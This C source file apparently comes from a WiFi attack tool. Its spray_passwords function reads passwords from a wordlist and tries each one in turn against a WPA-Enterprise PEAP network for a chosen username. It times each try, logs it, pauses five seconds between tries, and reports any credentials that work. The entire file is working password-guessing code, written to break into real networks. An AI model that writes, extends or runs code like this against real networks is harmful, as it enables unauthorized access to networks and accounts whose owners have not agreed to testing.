#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <time.h>
#include "read_passwords.h"
#include "../wifi/connect.h"
#include "../config/logging.h"

#define ATTEMPT_DELAY 5

#define RED_TEXT "\033[0;31m"
#define RED_BOLD_TEXT "\033[1;31m"
#define GREEN_TEXT "\033[0;32m"
#define YELLOW_TEXT "\033[0;33m"
#define RESET_TEXT "\033[0m"
#define CYAN_TEXT "\033[0;36m"

static int is_valid_utf8(const char *str) {
    const unsigned char *s = (const unsigned char *)str;
    while (*s) {
        if (*s <= 0x7F) {
            s++;
        } else if ((*s & 0xE0) == 0xC0) {
            if ((s[1] & 0xC0) != 0x80) return 0;
            s += 2;
        } else if ((*s & 0xF0) == 0xE0) {
            if ((s[1] & 0xC0) != 0x80 || (s[2] & 0xC0) != 0x80) return 0;
            s += 3;
        } else if ((*s & 0xF8) == 0xF0) {
            if ((s[1] & 0xC0) != 0x80 ||
                (s[2] & 0xC0) != 0x80 ||
                (s[3] & 0xC0) != 0x80) return 0;
            s += 4;
        } else {
        return 0;
        }
    }
    return 1;
}

int spray_passwords(struct wpa_ctrl *ctrl, struct wpa_ctrl *mon, const char *path, const char *ssid, const char* identity) {
    FILE *fp = fopen(path, "r");
    if (!fp) {
        fprintf(stderr, "%sError opening password file: %s%s\n", RED_BOLD_TEXT, path, RESET_TEXT);
        return -1;
    }

    char password[256];
    int attempts = 0;

    while (fgets(password, sizeof(password), fp)) {
        password[strcspn(password, "\n")] = '\0';
        if (password[0] == '\0') continue;
        
        if (!is_valid_utf8(password)) {
            if (verbose) printf("%s[-] Skipping invalid UTF-8 password: %s%s\n", RED_TEXT, password, RESET_TEXT);
            log_write("SKIPPED | ssid: %s | user: %s | password: %s | reason: invalid UTF-8", ssid, identity, password);
            continue;
        }
        attempts++;

        struct timespec start, end;
        clock_gettime(CLOCK_MONOTONIC, &start);

        printf("%s[%d] Trying  %s : %s%s\n", CYAN_TEXT, attempts, identity, password, RESET_TEXT);

        int net_id = wifi_connect_peap(ctrl, ssid, identity, password);
        if (net_id < 0) {
            printf("%s[-] Failed to set up network%s\n", RED_TEXT, RESET_TEXT);
            continue;
        }

        int result = wifi_wait_for_connect(mon, 15);

        clock_gettime(CLOCK_MONOTONIC, &end);
        double elapsed = (end.tv_sec - start.tv_sec) + (end.tv_nsec - start.tv_nsec) / 1e9;
        if (result == 0) {
            printf("%s[+] Successfully connected with username:password: %s:%s (Time taken: %.2f seconds)%s\n", GREEN_TEXT, identity, password, elapsed, RESET_TEXT);
            log_write("SUCCESS | ssid: %s | user: %s | password: %s ", ssid, identity, password);
            fclose(fp);
            return 0;
        }

        printf("%s[-] Wrong password: %s %s(Time taken: %.2f seconds)\n", RED_TEXT, password, RESET_TEXT, elapsed);
        log_write("FAILURE | ssid: %s | user: %s | password: %s", ssid, identity, password);

        printf("    Waiting %s%ds%s before next attempt...\n", YELLOW_TEXT, ATTEMPT_DELAY, RESET_TEXT);
        sleep(ATTEMPT_DELAY);

    }
    fclose(fp);
    printf("%s[-] All passwords tried, none worked%s\n", RED_BOLD_TEXT, RESET_TEXT);
    return -1;

}

